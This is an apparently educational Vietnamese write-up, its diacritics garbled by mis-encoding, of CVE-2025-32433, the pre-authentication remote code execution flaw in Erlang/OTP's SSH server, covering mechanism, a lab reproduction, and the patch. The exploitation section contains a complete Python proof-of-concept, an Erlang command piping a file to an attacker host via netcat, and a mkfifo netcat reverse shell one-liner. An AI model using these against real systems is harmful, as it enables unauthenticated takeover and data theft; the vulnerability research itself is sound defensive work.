<div align="center">
    <h1>Nghi√™n c·ª©u CVE-2025-32433: L·ªó h·ªïng trong tri·ªÉn khai SSH c·ªßa Erlang/OTP</h1>
</div>

## 1. T·ªïng quan v·ªÅ CVE-2025-32433

`CVE-2025-32433` l√† m·ªôt l·ªó h·ªïng nghi√™m tr·ªçng trong m√°y ch·ªß `SSH` c·ªßa `Erlang/OTP`, cho ph√©p k·∫ª t·∫•n c√¥ng th·ª±c thi m√£ t·ª´ xa (`RCE`) m√† kh√¥ng c·∫ßn x√°c th·ª±c.

- CVE ID: `CVE-2025-32433`
- M·ª©c ƒë·ªô nghi√™m tr·ªçng: `Critical`
- ƒêi·ªÉm CVSS: `10`
- Ng√†y c√¥ng b·ªë: `16/04/2025`
- C√°c phi√™n b·∫£n ·∫£nh h∆∞·ªüng: 
    - `OTP 25.x`: ƒë·∫øn `25.3.2.19`
    - `OTP 26.x`: ƒë·∫øn `26.2.5.10`
    - `OTP 27.x`: ƒë·∫øn `27.3.2`
- C√°c phi√™n b·∫£n ƒë∆∞·ª£c v√°:
    - `OTP 25.3.2.20`
    - `OTP 26.2.5.11`
    - `OTP 27.3.3`

## 2. C√°c c√¥ng ngh·ªá li√™n quan
### 2.1. Erlang
- `Erlang` l√† m·ªôt ng√¥n ng·ªØ l·∫≠p tr√¨nh h√†m (`functional`) ƒë∆∞·ª£c thi·∫øt k·∫ø cho c√°c h·ªá th·ªëng ph√¢n t√°n, th·ªùi gian th·ª±c, c√≥ ƒë·ªô tin c·∫≠y v√† kh·∫£ nƒÉng ch·ªãu l·ªói cao - ƒë·∫∑c bi·ªát ph·ªï bi·∫øn trong c√°c lƒ©nh v·ª±c nh∆∞ vi·ªÖn th√¥ng, nh·∫Øn tin, IoT, v√† x·ª≠ l√Ω ƒë·ªìng th·ªùi quy m√¥ l·ªõn

### 2.2. OTP (Open Telecom Platform)
- `OTP` (`Open Telecom Platform`) kh√¥ng ph·∫£i l√† m·ªôt n·ªÅn t·∫£ng ri√™ng, m√† l√† b·ªô th∆∞ vi·ªán ti√™u chu·∫©n v√† framework ƒëi k√®m v·ªõi `Erlang`.
- `OTP` cung c·∫•p c√°c module nh∆∞ GenServer v√† Supervisor ƒë·ªÉ x√¢y d·ª±ng h·ªá th·ªëng ·ªïn ƒë·ªãnh, d·ªÖ m·ªü r·ªông v√† t·ª± ph·ª•c h·ªìi.

### 2.3. SSH
- `SSH (Secure Shell)` l√† m·ªôt giao th·ª©c m·∫°ng ƒë∆∞·ª£c s·ª≠ d·ª•ng r·ªông r√£i ƒë·ªÉ thi·∫øt l·∫≠p k·∫øt n·ªëi an to√†n gi·ªØa m√°y kh√°ch v√† m√°y ch·ªß qua m·ªôt k√™nh ƒë∆∞·ª£c m√£ h√≥a.
- `SSH` cho ph√©p th·ª±c hi·ªán c√°c thao t√°c ƒëi·ªÅu khi·ªÉn t·ª´ xa, truy·ªÅn t·ªáp, v√† th·ª±c thi l·ªánh tr√™n h·ªá th·ªëng m·ª•c ti√™u m·ªôt c√°ch b·∫£o m·∫≠t, nh·ªù v√†o c∆° ch·∫ø m√£ h√≥a m·∫°nh v√† x√°c th·ª±c danh t√≠nh ng∆∞·ªùi d√πng.
## 3. C∆° ch·∫ø khai th√°c
- L·ªó h·ªïng xu·∫•t ph√°t t·ª´ vi·ªác m√°y ch·ªß `SSH` c·ªßa `Erlang/OTP` x·ª≠ l√Ω kh√¥ng ƒë√∫ng c√°c th√¥ng ƒëi·ªáp giao th·ª©c `SSH` trong giai ƒëo·∫°n tr∆∞·ªõc x√°c th·ª±c.
- C·ª• th·ªÉ, m√°y ch·ªß cho ph√©p g·ª≠i v√† x·ª≠ l√Ω c√°c th√¥ng ƒëi·ªáp nh∆∞ `SSH_MSG_CHANNEL_OPEN` v√† `SSH_MSG_CHANNEL_REQUEST` tr∆∞·ªõc khi qu√° tr√¨nh x√°c th·ª±c ho√†n t·∫•t. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng m·ªü k√™nh v√† g·ª≠i y√™u c·∫ßu th·ª±c thi l·ªánh m√† kh√¥ng c·∫ßn cung c·∫•p th√¥ng tin x√°c th·ª±c h·ª£p l·ªá.
- Theo chu·∫©n `RFC 4252` v√† `RFC 4254`, m·ªôt m√°y ch·ªß `SSH` ph·∫£i ho√†n t·∫•t qu√° tr√¨nh x√°c th·ª±c tr∆∞·ªõc khi cho ph√©p c√°c h√†nh ƒë·ªông nh∆∞ m·ªü k√™nh, truy·ªÅn d·ªØ li·ªáu, ho·∫∑c th·ª±c thi l·ªánh.
- Trong qu√° tr√¨nh b·∫Øt tay (handshake) c·ªßa SSH ƒë·ªÉ thi·∫øt l·∫≠p k·∫øt n·ªëi, m·ªôt s·ªë lo·∫°i message quan tr·ªçng c√≥ `IDs >= 80` (nh∆∞ `SSH_MSG_CHANNEL_OPEN` v√† `SSH_MSG_CHANNEL_REQUEST` k·ªÉ tr√™n). N·∫øu m√°y ch·ªß `SSH` c·ªë g·∫Øng g·ª≠i nh·ªØng message n√†y tr∆∞·ªõc khi x√°c th·ª±c, n√≥ ph·∫£i ƒë∆∞·ª£c nh·∫≠n di·ªán v√† ng·∫Øt k·∫øt n·ªëi ngay l·∫≠p t·ª©c. Tuy nhi√™n n·∫øu m√°y ch·ªß kh√¥ng ƒë∆∞·ª£c c√†i ƒë·∫∑t ƒë·ªÉ th·ª±c hi·ªán ƒëi·ªÅu n√†y th√¨ r·∫•t d·ªÖ d·∫´n ƒë·∫øn l·ªó h·ªïng. 
- Quy tr√¨nh k·∫øt n·ªëi `SSH` h·ª£p l·ªá th√¥ng qua c√°c b∆∞·ªõc:
    - üîå K·∫øt n·ªëi TCP
    - ü§ù Trao ƒë·ªïi phi√™n b·∫£n SSH
    - üîê Kh·ªüi t·∫°o phi√™n l√†m vi·ªác
    - ‚úÖ X√°c th·ª±c ng∆∞·ªùi d√πng
    - üß± M·ªü k√™nh: Sau khi x√°c th·ª±c, client g·ª≠i g√≥i `SSH_MSG_CHANNEL_OPEN`
    - üí¨ G·ª≠i y√™u c·∫ßu th·ª±c thi: Client g·ª≠i `SSH_MSG_CHANNEL_REQUEST` v·ªõi y√™u c·∫ßu c·ª• th·ªÉ nh∆∞: `exec`, `shell`, `subsystem`.
- Tuy nhi√™n tr√™n h·ªá th·ªëng ch·ª©a l·ªó h·ªïng n√†y, vi·ªác g·ª≠i c√°c g√≥i tin m·ªü k√™nh v√† th·ª±c thi c√≥ th·ªÉ ƒë∆∞·ª£c th·ª±c hi·ªán tr∆∞·ªõc khi x√°c th·ª±c, ƒëi·ªÅu n√†y d·∫´n ƒë·∫øn `RCE` tr√™n h·ªá th·ªëng.
- N·∫øu `daemon Erlang/OTP` SSH ho·∫°t ƒë·ªông v·ªõi c√°c ƒë·∫∑c quy·ªÅn n√¢ng cao, ch·∫≥ng h·∫°n nh∆∞ root, th√¨ vi·ªác khai th√°c th√†nh c√¥ng c√≥ th·ªÉ c·∫•p cho t√°c nh√¢n ƒëe d·ªça to√†n quy·ªÅn ki·ªÉm so√°t h·ªá th·ªëng b·ªã ·∫£nh h∆∞·ªüng.

## 4. Th·ª±c nghi·ªám khai th√°c

- B√†i b√°o c√°o s·∫Ω th·ª±c hi·ªán d·ª±ng l·∫°i v√† m√¥ t·∫£ qu√° tr√¨nh khai th√°c tr√™n m√¥i tr∆∞·ªùng th·ª±c nghi·ªám th√¥ng qua c√°c PoC li√™n quan.
- PoC ƒë∆∞·ª£c s·ª≠ d·ª•ng: https://github.com/ProDefense/CVE-2025-32433

### 4.1. D·ª±ng l·∫°i m√¥i tr∆∞·ªùng.

- T·∫£i xu·ªëng PoC:
```bash
git clone https://github.com/ProDefense/CVE-2025-32433
```
![CVE-2025-32433](Images/2.png)

- Build m√¥i tr∆∞·ªùng c√≥ trong `Dockerfile`. Theo ƒë√≥, Erlang/OTP s·ª≠ d·ª•ng phi√™n b·∫£n `26.2.5.10` ch·ª©a l·ªó h·ªïng.
- Server `SSH` ƒë∆∞·ª£c setup ch·∫°y tr√™n port `2222`, kh√¥ng cho ph√©p ƒëƒÉng nh·∫≠p nh∆∞ng v·∫´n ghi l·∫°i log.

![CVE-2025-32433](Images/4.png)

- Ch·∫°y container v·ª´a build, ki·ªÉm tra xem `SSH` ƒë√£ ƒë∆∞·ª£c ch·∫°y th√†nh c√¥ng ch∆∞a.

### 4.2. Qu√° tr√¨nh khai th√°c

- M·ª•c ti√™u th·ª±c hi·ªán l√† `RCE` tr√™n h·ªá th·ªëng th√¥ng qua SSH server m√† kh√¥ng c·∫ßn ƒëƒÉng nh·∫≠p.
- S·ª≠ d·ª•ng script sau:

```python
import socket
import struct
import time

HOST = "127.0.0.1"  # Target IP (change if needed)
PORT = 2222  # Target port (change if needed)


# Helper to format SSH string (4-byte length + bytes)
def string_payload(s):
    s_bytes = s.encode("utf-8")
    return struct.pack(">I", len(s_bytes)) + s_bytes


# Builds SSH_MSG_CHANNEL_OPEN for session
def build_channel_open(channel_id=0):
    return (
        b"\x5a"  # SSH_MSG_CHANNEL_OPEN
        + string_payload("session")
        + struct.pack(">I", channel_id)  # sender channel ID
        + struct.pack(">I", 0x68000)  # initial window size
        + struct.pack(">I", 0x10000)  # max packet size
    )


# Builds SSH_MSG_CHANNEL_REQUEST with 'exec' payload
def build_channel_request(channel_id=0, command=None):
    if command is None:
        command = 'file:write_file("/lab.txt", <<"pwned">>).'
    return (
        b"\x62"  # SSH_MSG_CHANNEL_REQUEST
        + struct.pack(">I", channel_id)
        + string_payload("exec")
        + b"\x01"  # want_reply = true
        + string_payload(command)
    )


# Builds a minimal but valid SSH_MSG_KEXINIT packet
def build_kexinit():
    cookie = b"\x00" * 16

    def name_list(l):
        return string_payload(",".join(l))

    # Match server-supported algorithms from the log
    return (
        b"\x14"
        + cookie
        + name_list(
            [
                "curve25519-sha256",
                "ecdh-sha2-nistp256",
                "diffie-hellman-group-exchange-sha256",
                "diffie-hellman-group14-sha256",
            ]
        )  # kex algorithms
        + name_list(["rsa-sha2-256", "rsa-sha2-512"])  # host key algorithms
        + name_list(["aes128-ctr"]) * 2  # encryption client->server, server->client
        + name_list(["hmac-sha1"]) * 2  # MAC algorithms
        + name_list(["none"]) * 2  # compression
        + name_list([]) * 2  # languages
        + b"\x00"
        + struct.pack(">I", 0)  # first_kex_packet_follows, reserved
    )


# Pads a packet to match SSH framing
def pad_packet(payload, block_size=8):
    min_padding = 4
    padding_len = block_size - ((len(payload) + 5) % block_size)
    if padding_len < min_padding:
        padding_len += block_size
    return (
        struct.pack(">I", len(payload) + 1 + padding_len)
        + bytes([padding_len])
        + payload
        + bytes([0] * padding_len)
    )


# === Exploit flow ===
try:
    with socket.create_connection((HOST, PORT), timeout=5) as s:
        print("[*] Connecting to SSH server...")

        # 1. Banner exchange
        s.sendall(b"SSH-2.0-OpenSSH_8.9\r\n")
        banner = s.recv(1024)
        print(f"[+] Received banner: {banner.strip().decode(errors='ignore')}")
        time.sleep(0.5)  # Small delay between packets

        # 2. Send SSH_MSG_KEXINIT
        print("[*] Sending SSH_MSG_KEXINIT...")
        kex_packet = build_kexinit()
        s.sendall(pad_packet(kex_packet))
        time.sleep(0.5)  # Small delay between packets

        # 3. Send SSH_MSG_CHANNEL_OPEN
        print("[*] Sending SSH_MSG_CHANNEL_OPEN...")
        chan_open = build_channel_open()
        s.sendall(pad_packet(chan_open))
        time.sleep(0.5)  # Small delay between packets

        # 4. Send SSH_MSG_CHANNEL_REQUEST (pre-auth!)
        print("[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...")
        chan_req = build_channel_request(
            command='file:write_file("/lab.txt", <<"pwned">>).'
        )
        s.sendall(pad_packet(chan_req))

        print(
            "[‚úì] Exploit sent! If the server is vulnerable, it should have written to /lab.txt."
        )

        # Try to receive any response (might get a protocol error or disconnect)
        try:
            response = s.recv(1024)
            print(f"[+] Received response: {response.hex()}")
        except socket.timeout:
            print("[*] No response within timeout period (which is expected)")

except Exception as e:
    print(f"[!] Error: {e}")
```

- Lu·ªìng th·ª±c thi c·ªßa script tr√™n:
    - üìåK·∫øt n·ªëi ƒë·∫øn server
    ```py
    with socket.create_connection((HOST, PORT), timeout=5) as s:
    ```
    - üìåTrao ƒë·ªïi banner
    ```python
    s.sendall(b"SSH-2.0-OpenSSH_8.9\r\n")
    banner = s.recv(1024)
    ```
    - üìåG·ª≠i g√≥i `KEXINIT`
    ```py
    s.sendall(pad_packet(build_kexinit()))
    ```
    -  üìåG·ª≠i `CHANNEL_OPEN`
    ```python
    s.sendall(pad_packet(build_channel_open()))
    ```
    ‚Üí G·ª≠i g√≥i m·ªü channel tr∆∞·ªõc khi x√°c th·ª±c ‚Äî ƒë√¢y l√† g√≥i tin ƒë√°ng ra ph·∫£i ƒë∆∞·ª£c g·ª≠i sau khi x√°c th·ª±c.

    - üìåG·ª≠i `CHANNEL_REQUEST` d·∫°ng "exec"

    ```py
    s.sendall(pad_packet(build_channel_request(...)))
    ```
    ‚Üí T∆∞∆°ng t·ª±, g√≥i tin n√†y ƒë∆∞·ª£c g·ª≠i m√† kh√¥ng c·∫ßn x√°c th·ª±c, n·∫øu th·ª±c thi th√†nh c√¥ng, n√≥ s·∫Ω th·ª±c thi c√¢u l·ªánh cho ph√©p ghi m·ªôt file `lab.txt` tr√™n m·ª•c ti√™u v·ªõi n·ªôi dung l√† `pwned`.

    ```py
    command='file:write_file("/lab.txt", <<"pwned">>).'
    ```

    - üìåCu·ªëi c√πng l√† nh·∫≠n ph·∫£n h·ªìi.

- Th·ª±c thi script n√†y v·ªõi m√¥i tr∆∞·ªùng v·ª´a d·ª±ng ƒë∆∞·ª£c

![CVE-2025-32433](Images/3.png)

- Ki·ªÉm tra h·ªá th·ªëng, th·∫•y r·∫±ng file `lab.txt` ƒë√£ ƒë∆∞·ª£c ghi th√†nh c√¥ng.

![CVE-2025-32433](Images/5.png)

- Tuy nhi√™n, ƒë√¢y l√† khi ta c√≥ quy·ªÅn truy c·∫≠p h·ªá th·ªëng, ƒë·ª©ng d∆∞·ªõi g√≥c nh√¨n c·ªßa k·∫ª t·∫•n c√¥ng, th·ª≠ t√¨m c√°ch ƒë·ªçc file `lab.txt` n√†y m√† kh√¥ng c√≥ quy·ªÅn truy c·∫≠p.

- T·∫°i ƒë√¢y, ta thay ƒëo·∫°n m√£ RCE b·∫±ng l·ªánh ƒë·ªçc file sau ƒë√≥ g·ª≠i n·ªôi dung qua `nc` v·ªÅ m√°y attacker. (T·∫•t nhi√™n, trong tr∆∞·ªùng h·ª£p n√†y, gi·∫£i s·ª≠ m·ª•c ti√™u ƒë√£ ƒë∆∞·ª£c c√†i ƒë·∫∑t `nc`)

```python
    'os:cmd("cat /lab.txt | nc 10.0.2.15 4444").'
```

![CVE-2025-32433](Images/6.png)

- N·ªôi dung file `lab.txt` s·∫Ω ƒë∆∞·ª£c g·ª≠i t·ªõi tr√¨nh l·∫Øng nghe tr√™n m√°y t·∫•n c√¥ng.

![CVE-2025-32433](Images/7.png)

- Theo ƒë√≥, attacker ho√†n to√†n c√≥ th·ªÉ ch√®n m·ªôt reverse shell ƒë·ªÉ ki·ªÉm so√°t h·ªá th·ªëng

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.15 4444 >/tmp/f
```

![CVE-2025-32433](Images/8.png)

- Th√†nh c√¥ng t·∫°o shell k·∫øt n·ªëi ƒë·∫øn m√°y n·∫°n nh√¢n.

![CVE-2025-32433](Images/9.png)

## 5. V√° l·ªó h·ªïng 

- Sau khi ƒë∆∞·ª£c ghi nh·∫≠n, l·ªó h·ªïng n√†y ƒë∆∞·ª£c kh·∫Øc ph·ª•c t·∫°i phi√™n b·∫£n OTP-26.2.5.11.
- Chi ti·∫øt c·∫≠p nh·∫≠t m√£ ngu·ªìn ƒë∆∞·ª£c l∆∞u t·∫°i [github c·ªßa erlang](https://github.com/erlang/otp/commit/b1924d37fd83c070055beb115d5d6a6a9490b891#diff-ceeb1aeeb602e1424c13d9da9383e0782f65869d6e64e015c194145b1a64edcd) 
- C·ª• th·ªÉ, CVE n√†y ƒë∆∞·ª£c kh·∫Øc ph·ª•c b·∫±ng c√°ch th√™m m·ªôt pattern matching (kh·ªõp m·∫´u) trong Erlang (th∆∞·ªùng ƒë∆∞·ª£c d√πng ƒë·ªÉ x·ª≠ l√Ω message trong m·ªôt state machine c·ªßa m·ªôt qu√° tr√¨nh SSH server.)

```erl
handle_msg(Msg, Connection, server, Ssh = #ssh{authenticated = false})
```

- Theo ƒë√≥ n√≥ ki·ªÉm tra g√≥i `Msg` ƒë√≥ l√† g√¨, tr·∫°ng th√°i k·∫øt n·ªëi c≈©ng nh∆∞ vai tr√≤ (`server` hay `client`). B·∫•t k·ª≥ message n√†o g·ª≠i sau x√°c th·ª±c (t·ª©c c√≥ opcode ‚â• 80) ƒë·ªÅu b·ªã ng·∫Øt k·∫øt n·ªëi v√† ghi l·∫°i log.

```
handle_msg(#ssh_msg_disconnect{code = Code, description = Description}, Connection, _, _SSH) ->
    {disconnect, {Code, Description}, handle_stop(Connection)};

handle_msg(Msg, Connection, server, Ssh = #ssh{authenticated = false}) ->
    %% See RFC4252 6.
    %% Message numbers of 80 and higher are reserved for protocols running
    %% after this authentication protocol, so receiving one of them beforeAdd commentMore actions
    %% authentication is complete is an error, to which the server MUST
    %% respond by disconnecting, preferably with a proper disconnect message
    %% sent to ease troubleshooting.
    MsgFun = fun(M) ->
                     MaxLogItemLen = ?GET_OPT(max_log_item_len, Ssh#ssh.opts),
                     io_lib:format("Connection terminated. Unexpected message for unauthenticated user."
                                   " Message:  ~w", [M],
                                   [{chars_limit, MaxLogItemLen}])
             end,
    ?LOG_DEBUG(MsgFun, [Msg]),
    {disconnect, {?SSH_DISCONNECT_PROTOCOL_ERROR, "Connection refused"}, handle_stop(Connection)};
```

- C√°c h·ªá th·ªëng s·ª≠ d·ª•ng c√°c phi√™n b·∫£n g·∫∑p l·ªói c·∫ßn n√¢ng c·∫•p l√™n phi√™n b·∫£n ƒë√£ ƒë∆∞·ª£c v√°: `OTP-27.3.3`, `OTP-26.2.5.11`, `OTP-25.3.2.20`.
- M·ªôt s·ªë gi·∫£i ph√°p h·∫°n ch·∫ø l·ªó h·ªïng t·∫°m th·ªùi nh∆∞:
    - T·∫Øt m√°y ch·ªß Erlang/OTP SSH n·∫øu kh√¥ng c·∫ßn thi·∫øt.
    - Tri·ªÉn khai c√°c quy t·∫Øc t∆∞·ªùng l·ª≠a ƒë·ªÉ h·∫°n ch·∫ø quy·ªÅn truy c·∫≠p v√†o m√°y ch·ªß SSH, ch·ªâ cho ph√©p c√°c ƒë·ªãa ch·ªâ IP ƒë√°ng tin c·∫≠y.
    - Tri·ªÉn khai c√°c c∆° ch·∫ø x√°c th·ª±c b·ªï sung ƒë·ªÉ b·∫£o m·∫≠t quy·ªÅn truy c·∫≠p SSH.‚Äã

## T√†i li·ªáu tham kh·∫£o v√† c√°c b√†i vi·∫øt li√™n quan

- https://nvd.nist.gov/vuln/detail/CVE-2025-32433
- https://github.com/erlang
- https://github.com/ProDefense/CVE-2025-32433
- https://www.offsec.com/blog/cve-2025-32433/
- https://www.cybereason.com/blog/rce-vulnerability-erlang-otp
- https://tryhackme.com/room/erlangotpsshcve202532433

